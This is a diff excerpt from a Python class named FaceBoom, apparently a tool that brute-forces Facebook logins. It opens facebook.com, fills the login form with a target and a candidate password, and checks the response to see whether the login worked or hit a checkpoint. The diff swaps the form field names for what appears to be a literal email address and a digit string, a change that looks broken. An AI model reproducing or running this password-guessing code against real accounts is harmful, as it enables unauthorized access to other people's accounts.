@@ -85,8 +85,8 @@ class FaceBoom(object):
         try:
             self.br.open("https://facebook.com")
             self.br.select_form(nr=0)
-            self.br.form['email']=target
-            self.br.form['pass']= password
+            self.br.form['shahishabz@gmail.com']=target
+            self.br.form['1234567890']= password
             self.br.method ="POST"
             if self.br.submit().get_data().__contains__(b'home_icon'):return  1
             elif "checkpoint" in self.br.geturl(): return 2
